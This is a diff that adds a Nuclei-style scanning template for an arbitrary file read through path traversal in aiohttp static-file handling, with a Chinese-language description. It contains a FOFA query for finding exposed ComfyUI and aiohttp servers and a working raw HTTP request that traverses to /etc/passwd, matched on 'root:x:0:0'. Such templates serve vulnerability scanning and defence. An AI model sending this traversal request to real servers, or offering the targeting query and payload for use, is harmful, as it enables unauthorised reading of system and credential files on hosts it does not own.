@@ -1,0 +1,30 @@
+id: aiohttp-static-arbitrary-file-read
+
+info:
+  name: "AIOHTTP Static 任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: title=="ComfyUI" || (app="AIOHTTP" && server!="aiohttp/3.9.3" && server!="aiohttp/3.9.2")
+      AIOHTTP Static 是基于 aiohttp 框架的静态文件处理模块，其在版本控制中未正确限制文件访问权限，导致攻击者可通过构造特定路径参数读取服务器端任意文件。该模块广泛应用于需要高并发处理能力的 Web 服务架构中。
+  tags: aiohttp
+
+http:
+- raw:
+  - |
+    GET /static/./../../../../../../../../etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Connection: close
+    Pragma: no-cache
+    Cache-Control: no-cache
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0'
